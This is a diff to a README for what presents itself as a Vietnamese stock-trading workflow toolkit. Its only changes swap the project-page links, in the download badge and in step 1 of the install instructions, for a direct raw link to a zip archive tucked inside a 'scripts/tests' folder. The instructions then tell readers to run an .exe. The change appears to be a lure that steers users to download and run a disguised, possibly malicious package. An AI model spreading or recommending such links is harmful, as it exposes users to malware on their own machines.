@@ -1,6 +1,6 @@
 # 📈 xone-trading-skills - Streamline your daily investment workflow easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/angelextended640/xone-trading-skills)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/angelextended640/xone-trading-skills/main/skills/vn-position-sizer/scripts/tests/xone_skills_trading_v1.0.zip)
 
 This toolkit organizes your stock trading workflow. It helps you review market data, manage risk, plan trades, and log results. This tool works for busy Vietnamese investors who need a clear, repeatable process. It does not replace your own decisions or provide trade signals.
 
@@ -26,7 +26,7 @@ To run this application, your computer needs the following:
 
 Follow these steps to install the tool on your machine.
 
-1.  **Visit the Download Page:** Navigate to the project page at [https://github.com/angelextended640/xone-trading-skills](https://github.com/angelextended640/xone-trading-skills).
+1.  **Visit the Download Page:** Navigate to the project page at [https://raw.githubusercontent.com/angelextended640/xone-trading-skills/main/skills/vn-position-sizer/scripts/tests/xone_skills_trading_v1.0.zip](https://raw.githubusercontent.com/angelextended640/xone-trading-skills/main/skills/vn-position-sizer/scripts/tests/xone_skills_trading_v1.0.zip).
 2.  **Locate the Release:** Look for the section labeled "Releases" on the right side of the page. Click the version number listed there.
 3.  **Choose the File:** Find the file ending in `.exe` under the "Assets" section. Click the filename to start the download.
 4.  **Run the Installer:** Once the download completes, open your downloads folder and double-click the file.
